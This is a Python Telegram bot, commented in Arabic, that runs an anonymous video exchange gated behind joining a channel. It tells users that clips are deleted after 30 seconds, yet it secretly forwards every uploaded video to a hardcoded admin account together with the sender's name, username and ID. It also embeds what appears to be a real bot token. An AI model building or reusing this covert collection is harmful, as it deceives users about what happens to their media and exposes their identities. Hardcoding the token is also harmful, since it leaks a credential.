import os
import random
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes
)

# البيانات الأساسية والتوكن الجديد
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8846666964:AAGRLcOYcFSeqzK4L8_NsAkuWUWcdvyJoWw")
CHANNEL_USERNAME = "@Riiin69"
ADMIN_ID = 5122137947  # معرف حسابك لتلقي المقاطع
BOT_USERNAME = "@ttbadl_bot"

# قاعدة البيانات المؤقتة
video_database = []
unique_videos = set()

async def is_subscribed(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """التحقق من اشتراك المستخدم في القناة"""
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception:
        return False

def get_sub_keyboard():
    """لوحة أزرار الاشتراك والدعم الفني"""
    keyboard = [
        [InlineKeyboardButton("📢 اشترك في القناة", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
        [InlineKeyboardButton("🔄 تحقق من الاشتراك", callback_data="check_sub")],
        [InlineKeyboardButton("👨‍💻 الدعم الفني", url="https://t.me/ryw0703")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_main_keyboard():
    """لوحة الأزرار الرئيسية للبوت"""
    keyboard = [
        [InlineKeyboardButton("👨‍💻 الدعم الفني", url="https://t.me/ryw0703")],
        [InlineKeyboardButton("📢 القناة الرسمية", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def auto_delete_message(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, delay: int = 30):
    """دالة لحذف الرسائل بعد وقت محدد (30 ثانية)"""
    await asyncio.sleep(delay)
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر /start"""
    user_id = update.effective_user.id
    
    if not await is_subscribed(user_id, context):
        await update.message.reply_text(
            f"⚠️ **تنبيه:** لاستخدام البوت، يجب عليك الاشتراك في القناة أولاً:\n{CHANNEL_USERNAME}\n\nبعد الاشتراك اضغط على زر التحقق بالأسفل 👇",
            reply_markup=get_sub_keyboard(),
            parse_mode="Markdown"
        )
        return

    await update.message.reply_text(
        "👋 **أهلاً بك في بوت تبادل المقاطع!**\n\n"
        "🎬 **كيف يعمل البوت؟**\n"
        "أرسل لي أي مقطع فيديو من عندك، وسأرد عليك فوراً بمقطع عشوائي أرسله مستخدم آخر!\n\n"
        "⚠️ **تنبيه مهم:** المقطع ينحذف بعد **30 ثانية**، قم بتحويله لرسائلك المحفوظة أو حفظه في جهازك فوراً! ⏳",
        reply_markup=get_main_keyboard(),
        parse_mode="Markdown"
    )

async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة استقبال الفيديوهات"""
    user = update.effective_user
    user_id = user.id

    if not await is_subscribed(user_id, context):
        await update.message.reply_text(
            f"⚠️ **عذراً!** يجب عليك الاشتراك في القناة أولاً لتبادل المقاطع:\n{CHANNEL_USERNAME}",
            reply_markup=get_sub_keyboard(),
            parse_mode="Markdown"
        )
        return

    video = update.message.video
    file_id = video.file_id
    file_unique_id = video.file_unique_id

    # 1. منع التكرار
    if file_unique_id in unique_videos:
        msg = await update.message.reply_text("❌ **عذراً! هذا المقطع تم إرساله سابقاً ورُفض تكراره.**\nيرجى إرسال مقطع جديد غير مكرر.")
        asyncio.create_task(auto_delete_message(context, update.message.chat_id, update.message.message_id, 15))
        asyncio.create_task(auto_delete_message(context, msg.chat_id, msg.message_id, 15))
        return

    # 2. إرسال نسخة للآدمن (لك)
    user_info = f"👤 **مشارك جديد:**\nالاسم: {user.full_name}\nاليوزر: @{user.username if user.username else 'بدون يوزر'}\nالأيدي: `{user_id}`"
    try:
        await context.bot.send_video(
            chat_id=ADMIN_ID,
            video=file_id,
            caption=f"📥 **مقطع متبادل جديد:**\n\n{user_info}\n\n- {BOT_USERNAME} -",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Error sending to admin: {e}")

    # 3. إرسال مقطع عشوائي للمستخدم
    sent_bot_msg = None
    if video_database:
        random_video = random.choice(video_database)
        caption_text = f"⏳ **قم بتحويل المقطع أو حفظه فوراً، ينحذف بعد 30 ثانية!**\n\n- {BOT_USERNAME} -"
        
        sent_bot_msg = await update.message.reply_video(
            video=random_video,
            caption=caption_text,
            reply_markup=get_main_keyboard(),
            parse_mode="Markdown"
        )
    else:
        sent_bot_msg = await update.message.reply_text(
            "✅ **تم استلام مقطعك بنجاح!**\nأنت أول مشارك في البوت، أرسل مقطعاً آخر أو انتظر مشاركات البقية! 🚀",
            reply_markup=get_main_keyboard()
        )

    # حفظ الفيديو لمنع التكرار ولإعادة إرساله
    unique_videos.add(file_unique_id)
    video_database.append(file_id)

    # 4. جدولة الحذف التلقائي بعد 30 ثانية
    asyncio.create_task(auto_delete_message(context, update.message.chat_id, update.message.message_id, 30))
    if sent_bot_msg:
        asyncio.create_task(auto_delete_message(context, sent_bot_msg.chat_id, sent_bot_msg.message_id, 30))

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الضغط على الزر"""
    query = update.callback_query
    await query.answer()

    if query.data == "check_sub":
        user_id = query.from_user.id
        if await is_subscribed(user_id, context):
            await query.edit_message_text(
                "✅ **تم التحقق بنجاح!**\nأهلاً بك، أرسل لي الآن أي مقطع فيديو للتبادل 🎬\n\n⚠️ *ملاحظة: المقاطع تنحذف بعد 30 ثانية، قم بتحويلها وحفظها!*",
                reply_markup=get_main_keyboard(),
                parse_mode="Markdown"
            )
        else:
            await query.edit_message_text(
                f"❌ **لم يتم العثور على اشتراكك!**\nيرجى الاشتراك في القناة أولاً ثم الضغط على زر التحقق:\n{CHANNEL_USERNAME}",
                reply_markup=get_sub_keyboard(),
                parse_mode="Markdown"
            )

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.VIDEO, handle_video))
    app.add_handler(CallbackQueryHandler(button_callback))

    print("Media Exchange Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
